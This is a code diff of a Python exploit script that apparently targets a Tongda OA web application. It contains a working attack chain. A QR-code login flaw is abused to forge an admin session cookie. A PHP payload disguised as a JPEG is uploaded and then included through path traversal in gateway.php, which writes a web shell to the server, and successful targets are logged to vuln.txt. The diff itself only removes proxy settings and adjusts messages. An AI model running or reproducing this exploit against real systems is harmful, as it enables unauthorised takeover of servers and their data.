@@ -29,19 +29,19 @@ def get_cookie(url):
         "Referer": "https://google.com",
     }
     try:
-        req1 = requests.get(url + "/ispirit/login_code.php", headers=checkHeader, verify=False, timeout=25, proxies=proxy)
+        req1 = requests.get(url + "/ispirit/login_code.php", headers=checkHeader, verify=False, timeout=25)
         if req1.status_code == 200 and "codeuid" in req1.text: 
             codeUid = json.loads(req1.text)["codeuid"]
         else:
-            req1 = requests.get(url + "/general/login_code.php", headers=checkHeader, verify=False, timeout=25, proxies=proxy)
+            req1 = requests.get(url + "/general/login_code.php", headers=checkHeader, verify=False, timeout=25)
             status = req1.text.find('{"status":1')
             if req1.status_code == 200 and status != -1:
                 codeUid = json.loads(req1.text[status:])["code_uid"]
             else:
                 return "123"
-        req2 = requests.post(url+ "/general/login_code_scan.php", data={"codeuid": codeUid, "uid": int(1), "source": "pc", "type": "confirm", "username": "admin"}, headers=checkHeader, verify=False, timeout=25, proxies=proxy)
+        req2 = requests.post(url+ "/general/login_code_scan.php", data={"codeuid": codeUid, "uid": int(1), "source": "pc", "type": "confirm", "username": "admin"}, headers=checkHeader, verify=False, timeout=25)
         if req2.status_code == 200 and json.loads(req2.text)["status"] == "1":
-            req3 = requests.get(url + "/ispirit/login_code_check.php?codeuid=" + codeUid, headers=checkHeader, verify=False, timeout=25, proxies=proxy)
+            req3 = requests.get(url + "/ispirit/login_code_check.php?codeuid=" + codeUid, headers=checkHeader, verify=False, timeout=25)
             if req3.status_code == 200 and '"uid":"1"' in req3.text:
                 cookie = req3.headers["Set-Cookie"]
                 return cookie
@@ -65,7 +65,7 @@ def exp(u):
 
     cookie = get_cookie(u)
     if cookie != "123":
-        printFlag = "[Login]：" + u + "\n"
+        printFlag = "[Login successful]：" + u + "\n"
     header["Cookie"] = cookie
 
     # password:a
@@ -76,20 +76,19 @@ def exp(u):
     uploadData = "------fuck123\r\nContent-Disposition: form-data; name=\"UPLOAD_MODE\"\r\n\r\n1\r\n------fuck123\r\nContent-Disposition: form-data; name=\"P\"\r\n\r\n" + cookie[cookie.find("=")+1:cookie.find(";")] + "\r\n------fuck123\r\nContent-Disposition: form-data; name=\"DEST_UID\"\r\n\r\n1\r\n------fuck123\r\nContent-Disposition: form-data; name=\"ATTACHMENT\"; filename=\"jpg\"\r\nContent-Type: image/jpeg\r\n\r\n<?php\r\nfile_put_contents($_SERVER[\"DOCUMENT_ROOT\"].\"/" + webPath + "\", base64_decode('" + b64Shell + "'));\r\necho \"" + uploadFlag + "\";\r\n?>\r\n------fuck123--"
     try:
         uploadHeader["Cookie"] = cookie
-        req1 = requests.post(u + "/ispirit/im/upload.php", headers=uploadHeader, verify=False, data=uploadData, timeout=25, proxies=proxy)
+        req1 = requests.post(u + "/ispirit/im/upload.php", headers=uploadHeader, verify=False, data=uploadData, timeout=25)
         text = req1.text
         if req1.status_code == 200 and "[vm]" in text:
             uploadFilePath = text[text.find("@")+1:text.find("|")].replace("_", "/")
-            # includeData = 'json={"url":"../../../general/../attach/im/' + uploadFilePath + '.jpg"}'
             includeData = 'json={"url":"/general/../../attach/im/' + uploadFilePath + '.jpg"}'
-            req2 = requests.post(u + "/mac/gateway.php", headers=header, verify=False, data=includeData, timeout=25, proxies=proxy)
-            if req2.status_code == 404:
-                req2 = requests.post(u + "/ispirit/interface/gateway.php", headers=header, verify=False, data=includeData, timeout=25, proxies=proxy)
+            req2 = requests.post(u + "/mac/gateway.php", headers=header, verify=False, data=includeData, timeout=25)
+            if req2.status_code == 404 or uploadFlag not in req2.text:
+                req2 = requests.post(u + "/ispirit/interface/gateway.php", headers=header, verify=False, data=includeData, timeout=25)
             if req2.status_code == 200 and uploadFlag in req2.text:
                 shellPath = u + webPath
-                req3 = requests.get(shellPath, headers=header, verify=False, timeout=25, proxies=proxy)
+                req3 = requests.get(shellPath, headers=header, verify=False, timeout=25)
                 if shellFlag in req3.text:
-                    printFlag = "[Getshell]：" + shellPath + "\n"
+                    printFlag = "[Getshell successful]：" + shellPath + "\n"
                     wirte_targets(shellPath, "vuln.txt")
     except:
         pass
